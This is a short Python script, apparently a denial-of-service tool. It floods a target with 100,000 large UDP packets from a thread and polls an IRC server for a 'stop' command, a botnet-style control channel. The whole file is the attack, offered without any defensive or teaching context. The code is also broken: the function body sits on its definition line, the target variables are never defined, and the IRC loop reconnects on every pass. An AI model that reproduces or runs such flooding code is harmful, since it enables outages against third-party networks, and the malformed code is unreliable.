import socket
from threading import Thread
import time

IRC_SERVER = "irc.example.com"
IRC_PORT = 6667
CHANNEL = "#chatterbox"

def send_packets(target_ip, target_port, duration):    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(100000):  # Send 100,000 packets
        packet = b'A' * 5000  # Create a 5000-byte packet
        s.sendto(packet, (target_ip, target_port))
    
    time.sleep(duration)
    
t1 = Thread(target=send_packets, args=(target_ip, target_port, duration))
t1.start()

# Wait for the IRC server to send a stop signal
while True:    irc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    irc_socket.connect((IRC_SERVER, IRC_PORT))
    
    message = irc_socket.recv(1024).decode()
    if message == "stop": break

irc_socket.close()
